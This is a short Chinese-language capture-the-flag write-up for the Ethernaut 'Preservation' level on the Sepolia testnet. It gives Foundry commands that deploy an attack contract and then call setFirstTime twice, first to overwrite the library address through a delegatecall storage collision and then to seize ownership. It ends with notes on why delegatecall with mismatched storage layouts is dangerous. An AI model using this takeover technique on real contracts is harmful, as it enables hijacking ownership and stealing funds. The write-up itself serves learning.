# 17-Preservation
```
# 1. 部署攻击合约
forge create src/17-Preservation/PreservationAttack.sol:PreservationAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast
=> Deployed to: 0xA913BB312e3b6A7E21bc6Af3Da388fC585EbFc69
# 2. 查看当前 owner
cast call $Preservation_ADDRESS "owner()" --rpc-url $sepolia_rpc
# 3. 第一次攻击：替换 library 地址
cast send $Preservation_ADDRESS "setFirstTime(uint256)" \
    0x000000000000000000000000a913bb312e3b6a7e21bc6af3da388fc585ebfc69 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
# 4. 验证 timeZone1Library 是否被替换
cast call $Preservation_ADDRESS "timeZone1Library()" --rpc-url $sepolia_rpc
# 5. 第二次攻击：修改 owner
cast send $Preservation_ADDRESS "setFirstTime(uint256)" \
    0x0000000000000000000000004a2578679c9a9901844380c7340e074045e75853 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
```

### 考察点
- 1. delegatecall 的危险性
在调用者上下文执行代码
存储槽位置由被调用合约决定
如果布局不一致，会覆盖错误的变量
- 2. 没有验证 library 地址
允许用户通过 delegatecall 修改 library 地址
没有访问控制

